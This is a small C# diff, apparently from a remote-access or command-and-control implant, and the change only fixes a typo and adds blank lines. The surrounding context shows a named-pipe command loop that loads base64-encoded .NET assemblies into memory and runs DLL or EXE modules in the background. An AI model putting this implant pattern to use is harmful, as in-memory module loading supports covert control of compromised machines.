@@ -53,6 +53,8 @@ public class Program
             var pipeWriter = new StreamWriter(pipeServerStream);
             pipeWriter.AutoFlush = true;
             var ppass = pipeReader.ReadLine();
+
+
             var command = "";
             while (running)
             {
@@ -112,7 +114,7 @@ public class Program
                                             var assembly = Assembly.Load(Convert.FromBase64String(module));
                                         }
                                         catch (Exception e) { Console.WriteLine($"Error loading modules {e}"); }
-                                        sOutput2.WriteLine("Module loaded sucessfully");
+                                        sOutput2.WriteLine("Module loaded successfully");
                                     }
                                     else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
                                     {
